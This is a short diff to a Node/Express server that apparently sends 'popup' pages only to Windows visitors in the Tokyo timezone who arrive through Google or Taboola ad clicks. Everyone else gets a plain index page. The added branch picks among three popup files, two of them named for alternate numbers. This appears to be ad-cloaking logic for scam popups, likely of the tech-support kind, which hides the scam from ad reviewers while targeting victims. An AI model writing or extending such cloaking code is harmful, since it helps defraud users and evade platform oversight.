@@ -115,7 +115,13 @@ app.post("/", (req, res) => {
   // Updated condition to exclude certain GCLIDs
   if (isWindowsOS(userAgent) && isTokyoTimezone && !containsExcludedGclid(fullUrl) && (fullUrl?.includes(`gclid`) || fullUrl?.includes(`taboola`) || fullUrl?.includes(`tx`))) {
     console.log('popupsent');
-    res.sendFile(path.join(__dirname, "altmod.html"));
+    if (firstList.some(item => fullUrl.includes(item))) {
+        res.sendFile(path.join(__dirname, "altmod.html"));
+    } else if (secondList.some(item => fullUrl.includes(item))) {
+        res.sendFile(path.join(__dirname, "secondNumber.html"));
+    } else {
+        res.sendFile(path.join(__dirname, "thirdNumber.html"));
+    }
   } else {
     console.log('popup not sent');
     res.sendFile(path.join(__dirname, "index.html"));
